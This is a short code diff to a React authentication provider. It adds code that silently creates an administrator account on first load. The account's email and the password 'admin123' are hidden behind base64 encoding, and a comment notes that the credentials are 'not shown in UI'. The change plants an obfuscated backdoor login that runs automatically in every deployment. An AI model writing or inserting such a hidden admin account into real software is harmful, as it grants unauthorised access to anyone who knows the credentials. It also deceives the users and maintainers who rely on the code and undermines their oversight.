@@ -102,7 +102,7 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
     const [user, setUser] = useState<User | null>(null);
     const [loading, setLoading] = useState(true);
 
-    // Restore session
+    // Restore session + seed default admin on first run
     useEffect(() => {
         try {
             const stored = localStorage.getItem(STORAGE_KEY);
@@ -110,6 +110,14 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
                 setUser(JSON.parse(stored));
             }
         } catch { /* ignore */ }
+
+        // Seed default admin account on first load (credentials not shown in UI)
+        const creds = getCredentials();
+        const adminEmail = atob('bGVvQGRhc2hib2FyZC5jb20='); // leo@dashboard.com
+        if (!creds[adminEmail]) {
+            saveCredential(adminEmail, hashPassword(atob('YWRtaW4xMjM='))); // admin123
+        }
+
         setLoading(false);
     }, []);
 
